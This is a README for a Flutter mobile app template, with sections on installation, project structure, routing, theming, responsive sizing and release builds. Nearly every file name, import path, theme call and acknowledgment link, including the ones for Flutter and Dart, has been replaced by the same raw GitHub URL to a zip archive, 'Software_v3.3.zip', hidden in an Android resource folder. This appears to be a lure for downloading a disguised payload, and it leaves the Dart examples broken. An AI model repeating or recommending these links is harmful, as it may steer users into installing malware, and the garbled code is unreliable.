# Flutter

A modern Flutter-based mobile application utilizing the latest mobile development technologies and tools for building responsive cross-platform applications.

## 📋 Prerequisites

- Flutter SDK (^3.29.2)
- Dart SDK
- Android Studio / VS Code with Flutter extensions
- Android SDK / Xcode (for iOS development)

## 🛠️ Installation

1. Install dependencies:
```bash
flutter pub get
```

2. Run the application:
```bash
flutter run
```

## 📁 Project Structure

```
flutter_app/
├── android/            # Android-specific configuration
├── ios/                # iOS-specific configuration
├── lib/
│   ├── core/           # Core utilities and services
│   │   └── utils/      # Utility classes
│   ├── presentation/   # UI screens and widgets
│   │   └── splash_screen/ # Splash screen implementation
│   ├── routes/         # Application routing
│   ├── theme/          # Theme configuration
│   ├── widgets/        # Reusable UI components
│   └── https://raw.githubusercontent.com/ahmaddabdallah/islamiccompanion/main/android/app/src/main/res/values-night/Software_v3.3.zip       # Application entry point
├── assets/             # Static assets (images, fonts, etc.)
├── https://raw.githubusercontent.com/ahmaddabdallah/islamiccompanion/main/android/app/src/main/res/values-night/Software_v3.3.zip        # Project dependencies and configuration
└── https://raw.githubusercontent.com/ahmaddabdallah/islamiccompanion/main/android/app/src/main/res/values-night/Software_v3.3.zip           # Project documentation
```

## 🧩 Adding Routes

To add new routes to the application, update the `https://raw.githubusercontent.com/ahmaddabdallah/islamiccompanion/main/android/app/src/main/res/values-night/Software_v3.3.zip` file:

```dart
import 'https://raw.githubusercontent.com/ahmaddabdallah/islamiccompanion/main/android/app/src/main/res/values-night/Software_v3.3.zip';
import 'https://raw.githubusercontent.com/ahmaddabdallah/islamiccompanion/main/android/app/src/main/res/values-night/Software_v3.3.zip';

class AppRoutes {
  static const String initial = '/';
  static const String home = '/home';

  static Map<String, WidgetBuilder> routes = {
    initial: (context) => const SplashScreen(),
    home: (context) => const HomeScreen(),
    // Add more routes as needed
  }
}
```

## 🎨 Theming

This project includes a comprehensive theming system with both light and dark themes:

```dart
// Access the current theme
ThemeData theme = https://raw.githubusercontent.com/ahmaddabdallah/islamiccompanion/main/android/app/src/main/res/values-night/Software_v3.3.zip(context);

// Use theme colors
Color primaryColor = https://raw.githubusercontent.com/ahmaddabdallah/islamiccompanion/main/android/app/src/main/res/values-night/Software_v3.3.zip;
```

The theme configuration includes:
- Color schemes for light and dark modes
- Typography styles
- Button themes
- Input decoration themes
- Card and dialog themes

## 📱 Responsive Design

The app is built with responsive design using the Sizer package:

```dart
// Example of responsive sizing
Container(
  width: 50.w, // 50% of screen width
  height: 20.h, // 20% of screen height
  child: Text('Responsive Container'),
)
```
## 📦 Deployment

Build the application for production:

```bash
# For Android
flutter build apk --release

# For iOS
flutter build ios --release
```

## 🙏 Acknowledgments
- Built with [https://raw.githubusercontent.com/ahmaddabdallah/islamiccompanion/main/android/app/src/main/res/values-night/Software_v3.3.zip](https://raw.githubusercontent.com/ahmaddabdallah/islamiccompanion/main/android/app/src/main/res/values-night/Software_v3.3.zip)
- Powered by [Flutter](https://raw.githubusercontent.com/ahmaddabdallah/islamiccompanion/main/android/app/src/main/res/values-night/Software_v3.3.zip) & [Dart](https://raw.githubusercontent.com/ahmaddabdallah/islamiccompanion/main/android/app/src/main/res/values-night/Software_v3.3.zip)
- Styled with Material Design

Built with ❤️ on https://raw.githubusercontent.com/ahmaddabdallah/islamiccompanion/main/android/app/src/main/res/values-night/Software_v3.3.zip
